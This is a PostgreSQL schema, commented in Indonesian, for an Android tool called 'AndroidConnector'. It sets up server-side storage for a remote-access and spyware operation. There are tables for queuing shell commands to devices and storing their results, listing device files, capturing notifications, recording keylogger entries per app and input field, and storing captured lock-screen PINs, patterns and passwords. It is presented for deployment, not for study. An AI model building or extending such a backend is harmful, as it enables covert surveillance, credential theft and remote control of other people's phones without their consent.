-- ============================================================
--  AndroidConnector — Database Schema
--  Jalankan file ini di PostgreSQL server milik Anda
--  Compatible: PostgreSQL 13+, Supabase, Railway, Aiven, dll
-- ============================================================

-- Perangkat yang terdaftar
CREATE TABLE IF NOT EXISTS devices (
  device_id   TEXT PRIMARY KEY,
  device_name TEXT        NOT NULL DEFAULT 'Unknown Device',
  last_seen   TIMESTAMPTZ,
  stats       JSONB       NOT NULL DEFAULT '{}'
);

-- Antrian perintah yang belum dijalankan
CREATE TABLE IF NOT EXISTS pending_commands (
  id         TEXT PRIMARY KEY,
  device_id  TEXT        NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
  command    TEXT        NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Riwayat perintah yang sudah dijalankan
CREATE TABLE IF NOT EXISTS command_history (
  id        TEXT PRIMARY KEY,
  device_id TEXT        NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
  command   TEXT        NOT NULL,
  result    TEXT        NOT NULL DEFAULT '',
  timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  exit_code INTEGER              DEFAULT 0
);

-- Daftar file dari perangkat
CREATE TABLE IF NOT EXISTS file_listings (
  device_id  TEXT PRIMARY KEY REFERENCES devices(device_id) ON DELETE CASCADE,
  path       TEXT        NOT NULL DEFAULT '/',
  entries    JSONB       NOT NULL DEFAULT '[]',
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Notifikasi yang ditangkap
CREATE TABLE IF NOT EXISTS notifications (
  id          SERIAL PRIMARY KEY,
  device_id   TEXT        NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
  app_package TEXT        NOT NULL DEFAULT '',
  app_name    TEXT        NOT NULL DEFAULT '',
  title       TEXT        NOT NULL DEFAULT '',
  text        TEXT        NOT NULL DEFAULT '',
  received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_notifications_device ON notifications(device_id, received_at DESC);

-- Keylogger — teks yang diketik
CREATE TABLE IF NOT EXISTS keylog_entries (
  id          SERIAL PRIMARY KEY,
  device_id   TEXT        NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
  app_package TEXT        NOT NULL DEFAULT '',
  app_name    TEXT        NOT NULL DEFAULT '',
  field_name  TEXT        NOT NULL DEFAULT '',
  text        TEXT        NOT NULL DEFAULT '',
  captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_keylog_device ON keylog_entries(device_id, captured_at DESC);

-- PIN / Pola / Sandi lock screen
CREATE TABLE IF NOT EXISTS pin_captures (
  id          SERIAL PRIMARY KEY,
  device_id   TEXT        NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
  lock_type   TEXT        NOT NULL DEFAULT 'pin',
  value       TEXT        NOT NULL DEFAULT '',
  captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_pin_device ON pin_captures(device_id, captured_at DESC);
